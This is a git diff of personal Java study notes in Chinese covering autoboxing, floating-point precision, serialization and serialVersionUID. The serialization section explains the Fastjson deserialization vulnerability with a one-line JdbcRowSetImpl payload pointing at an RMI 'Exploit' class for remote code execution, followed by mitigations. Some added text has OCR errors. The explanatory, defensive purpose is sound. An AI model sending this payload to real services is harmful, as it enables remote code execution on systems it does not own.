@@ -1,7 +1,6 @@
-# Java基础
 
-[TOC]
-# Java基础
+
+
 ## 语言特点
 * 面向对象和面向过程对比。
     * 面向过程 性能好。
@@ -102,7 +101,23 @@ C++可以直接使用指针操作内存。响应的也比较晦涩难懂。 Java
 ![WX20190422-104914@2x](https://i.loli.net/2019/04/22/5cbd2bf294ec4.png)
 ## 类型转换
 ![WX20190422-105235@2x](https://i.loli.net/2019/04/22/5cbd2c8818b32.png)
+
+
+
+数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险。
+
+```java
+   Integer a2=null;
+        int b2=a2;
+```
+
+```java
+Exception in thread "main" java.lang.NullPointerException
+	at xyz.mosss.spring.examples.springboot.a.LockDemo.main(LockDemo.java:50)
+```
+
 ## Integer
+
 Integer中把-128到127
 ```java
 Integer a = 1000,b=1000;   
@@ -227,7 +242,31 @@ Integer默认会缓存`-127~128`范围的数字。 最大值也可以通过JVM�
 
 > 对于比较相关问题。 一般只有引用类型 `==` 会产生疑问。 对于引用类型 `==`或者没有重写`equals`方法时  比较的都是 对象的地址。 因为Integer 或者String 有缓存机制。 所以== 在缓存范围内会相等。对于`new`一个对象。地址就不一样了。
 
+## 浮点型
 
+```java
+double a1=1.0;
+double b1=0.9;
+System.out.println(a1-b1);//0.09999999999999998
+BigDecimal bigDecimal = new BigDecimal(0.9);
+BigDecimal bigDecimal1 = new BigDecimal(0.1);
+System.out.println(bigDecimal.subtract(bigDecimal1));//0.8000000000000000166533453693773481063544750213623046875
+
+BigDecimal bigDecimal2 = new BigDecimal("0.9");
+BigDecimal bigDecimal3 = new BigDecimal("0.1");
+System.out.println(bigDecimal2.subtract(bigDecimal3));//0.8
+
+BigDecimal bigDecimal4 = BigDecimal.valueOf(0.9);
+BigDecimal bigDecimal5 = BigDecimal.valueOf(0.1);
+System.out.println(bigDecimal4.subtract(bigDecimal5));//0.8
+```
+
+**，有个原则：**
+
+- - **程序中应尽量避免浮点数的比较**
+  - **float、double类型的运算往往都不准确**
+
+**如果需要精确计算，非要用String来够造BigDecimal不可**！
 
 ## String StringBuilder StringBuffer
 
@@ -329,183 +368,49 @@ RequestConfig config = RequestConfig.custom()
 
 
 
+* 
 
 
-# Java Web TODO
-* Servlet 
 
-接收用户请求 HttpServletRequest 在doGet() 或者doPost中做相应处理 返回HttpServletResponse
-init service destroy
-一个Servlet 只会有一个实例 所以不是线程安全的
-* 转发(Forward) 和重定向(Redirect) 区别
-    * 转发:服务器行为  重定向:客户端行为 302 +location
-    * 转发 只能跳转 本web应用内页面
-    * 地址栏 ：  转发 显示原来的地址
-    * 数据共享： 转发页面和转发到的页面可以共享request里面的数据
-    * 运用地方：forward:一般用于用户登陆的时候,根据角色转发到相应的模块. redirect:一般用于用户注销登陆时返回主页面和跳转到其它的网站等
-    效率： 转发高
-* JSP 侧重视图 Servlet侧重逻辑控制
 
-JSP 是在第一次请求的是时候被编译 work/Catalina/
-JSP 9大内置对象
-request response pageContext session application out config page exception
 
-* Cookie 在客户端 Session在服务器端  因为Http协议是无状态的 会话跟踪 维持会话  现在Token用的比较多
-
-
-
-
-# JAVA IO
-!> 同步和异步关注的是**消息通信机制**
-* 同步：在发出一个调用时，在没有得到结果之前，该调用就不返回。但是一旦调用返回，就得到返回值了。
-* 异步：调用发出之后，这个调用就直接返回了，所以没有返回结果
-
-!> 阻塞和非阻塞：程序在**等待调用结果时的状态。**
-* 阻塞调用是指调用结果返回之前，当前线程会被挂起。调用线程只有在得到结果之后才会返回。
-* 非阻塞调用指在不能立刻得到结果之前，该调用不会阻塞当前线程。
-* IO 分类
-    * BIO(Block-IO)阻塞IO
-    * NIO(Non-Block-IO)非阻塞IO
-    * AIO(Asynchronous I/O)异步非阻塞IO
-* NIO和IO的区别
-    1. IO是面向流的 NIO是面向缓存区的
-    2. IO流是阻塞的 NIO流是非阻塞的
-    3. NIO有选择器  IO没有
-
-
-
-
-
-
-
-# 数据结构和算法
-
-## 排序算法
-
-* 冒泡排序
-![849589-20171015223238449-2146169197](https://i.imgur.com/uRIt2KO.gif)
-
-
-时间复杂度T(n) = O(n2)
-
-```java
-/**
- * 冒泡排序的第一种实现, 没有任何优化
- * @param a
- * @param n
- */
-public static void bubbleSort1(int [] a, int n){
-    int i, j;
-
-    for(i=0; i<n; i++){//表示n次排序过程。
-        for(j=1; j<n-i; j++){
-            if(a[j-1] > a[j]){//前面的数字大于后面的数字就交换
-                //交换a[j-1]和a[j]
-                int temp;
-                temp = a[j-1];
-                a[j-1] = a[j];
-                a[j]=temp;
-            }
-        }
-    }
-```
-* 选择排序
-![849589-20171015224719590-1433219824](https://i.imgur.com/V5P9AQD.gif)
-
-
-时间复杂度T(n) = O(n2) 
-
-```java
- public static int[] selectionSort(int[] array) {
-        if (array.length == 0)
-            return array;
-        for (int i = 0; i < array.length; i++) {
-            int minIndex = i;
-            for (int j = i; j < array.length; j++) {
-                if (array[j] < array[minIndex]) //找到最小的数
-                    minIndex = j; //将最小数的索引保存
-            }
-            int temp = array[minIndex];
-            array[minIndex] = array[i];
-            array[i] = temp;
-        }
-        return array;
-    }
-```
-
-?> * 快速排序算法 TODO
-
-
-# 设计模式
-
-
-
-
-
-
-
-
-
-
-
-<!-- # 读写分离 分库分表 -->
-
-
-
-
-
-
-
-# OAuth2协议
-
-## 应用场景
-
-如：有一个"云冲印"的网站，可以将用户储存在Google的照片，冲印出来。用户为了使用该服务，必须让"云冲印"读取自己储存在Google上的照片。
-
-直接给他们账号密码是不安全的，需要一种安全的授权机制。
-
-## 几种授权模式
-
-* 客户端的授权模式
-
-* 授权码模式
-
-    >（A）用户访问客户端，后者将前者导向认证服务器。  
-（B）用户选择是否给予客户端授权。       
-（C）假设用户给予授权，认证服务器将用户导向客户端事先指定的"重定向URI"（redirection URI），同时附上一个授权码。     
-（D）客户端收到授权码，附上早先的"重定向URI"，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。   
-（E）认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。 
-
-* 简化模式
-
-简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了"授权码"这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。
-
-* 密码模式
-* 客户端模式
-
-
-
-
-
-
-
-# 补充
-
-
-
-# Apollo  哨兵  elstic job  motan dubbo elk docker es  hbase jenkins git nginx  
-
-# 亮点 openApi 模板化 自定义注释 统一 gateway入口   适配
-
-# zigbee 终端节点 汇聚节点 自组网  低功耗 通信协议 蓝牙 wifi
-
-
-
-
-# HR
-
-* 试用期时间 和通过试用期的标准
 ## 序列化
+
+内存中的数据对象只有转换为二进制流才可以进行数据持久化和网络传输。将数
+
+据对象转换为二进制流的过程称为对象的序列化（ Serialization ）。反之，将二进制流
+
+恢复为数据对象的过程称为反序列化（ Deserialization ）。序列化需要保留充分的信息
+
+以恢复数据对象，但是为了节约存储空间和网络带宽，序列化后的二进制流又要尽可
+
+能小。序列化常见的使用场景是盯 框架的数据传输。常见的序列化方式有三种
+
+
+
+1.  Java 原生序列化 
+
+使用 Java 原生序列化需注意， Java 反序歹lj 化时不会调用类的无参构造方法，而
+
+是调用 native 方法将成员变量赋值为对应类型的初始值。基于性能及兼容性考虑，不
+
+推荐使用 Java 原生序歹lj 化。
+
+2.  Hessian 序歹lj 化。
+
+相比 Hessian 1.0, Hessian 2.0 中增加了压缩编码，其序列化二进制流大小是 Java
+
+序列化的 50% 序列化耗时是 Java 序列化的 30 ，反序列化耗时是 Java 反序列化的
+
+20%
+
+3. JSON序列化
+
+4. 其他
+
+   专门针对Java语言的：Kryo，FST等等
+
+   跨语言的：Protostuff，ProtoBuf，Thrift，Avro，MsgPack等等
 
 我们知道，**反序列化必须拥有class文件，但随着项目的升级，class文件也会升级，序列化怎么保证升级前后的兼容性呢？**
 
@@ -528,13 +433,23 @@ public class Person implements Serializable {
 
 **序列化版本号可自由指定，如果不指定，JVM会根据类信息自己计算一个版本号，这样随着class的升级，就无法正确反序列化；不指定版本号另一个明显隐患是，不利于jvm间的移植，可能class文件没有更改，但不同jvm可能计算的规则不一样，这样也会导致无法反序列化。**
 
+
+
+序列化类新增属性时，请不要修改 serialVersionUID 字段，避免反序列失败；如果
+
+完全不兼容升级，避免反序列化混乱，那么请修改 serialVersionUID 值。
+
+说明：注意 serialVersionUID 不一致会抛出序列化运行时异常。
+
+
+
 什么情况下需要修改serialVersionUID呢？分三种情况。
 
 - 如果只是修改了方法，反序列化不容影响，则无需修改版本号；
 - 如果只是修改了静态变量，瞬态变量（transient修饰的变量），反序列化不受影响，无需修改版本号；
 - 如果修改了非瞬态变量，则可能导致反序列化失败。**如果新类中实例变量的类型与序列化时类的类型不一致，则会反序列化失败，这时候需要更改serialVersionUID。**如果只是新增了实例变量，则反序列化回来新增的是默认值；如果减少了实例变量，反序列化时会忽略掉减少的实例变量。
 
-### 总结
+**总结**
 
 所有需要网络传输的对象都需要实现序列化接口，通过建议所有的javaBean都实现Serializable接口。
 
@@ -553,6 +468,58 @@ public class Person implements Serializable {
 同一对象序列化多次，只有第一次序列化为二进制流，以后都只是保存序列化编号，不会重复序列化。
 
 建议所有可序列化的类加上serialVersionUID 版本号，方便项目升级。
+
+
+
+
+
+序歹lj 化通常会通过网络传输对象 而对象中往往有敏感数据，所以序列化常常
+
+成为黑客的攻击点，攻击者巧妙地利用反序列化过程构造恶意代码，使得程序在反序
+
+列化的过程中执行任意代码。 Java 工程中广泛使用的 pache Commons Collections
+
+Jackson fastjson 等都出现过反序列化漏洞。如何防范这种黑客攻击呢？有些对象的
+
+敏感属性不需要进行序列化传输 ，可以加 `transient` 关键字，避免把此属性信息转化为
+
+序列化的二进制流。如果一定要传递对象的敏感属性，可以使用对称与非对称加密方
+
+式独立传输，再使用某个方法把属性还原到对象中。应用开发者对序列化要有一定的
+
+安全防范意识 对传入数据的内容进行校验或权限控制，及时更新安全漏洞，避免受
+
+到攻击。
+
+### Fastjson反序列化漏洞
+
+[Fastjson反序列化漏洞 1.2.24-1.2.48(https://www.kingkk.com/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/)](https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/)
+
+[https://zhuanlan.zhihu.com/p/99075925](https://zhuanlan.zhihu.com/p/99075925)
+
+```json
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
+```
+
+当远程rmi服务找不到对应方法时，可以指定一个远程class让请求方去调用，从而去获取我们恶意构造的class文件，从而RCE。
+
+类似于Jackson，Fastjson中也支持指定类的反序列化，只需要在json的key中添加`@type`即可。
+
+**反序列化** **`@type`** **指定的类时，指定类的** **`setter`** **或** **`getter`** **被调用导致的命令执行。**
+
+
+
+措施
+
+enable_autotype 默认关闭
+
+维护黑名单  checkAutoType  这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。
+
+hash黑名单
+
+
+
+
 
 
 ## 修饰符
@@ -645,5 +612,5 @@ public class Person implements Serializable {
 
 
 
-# 内部类
+## 内部类
 
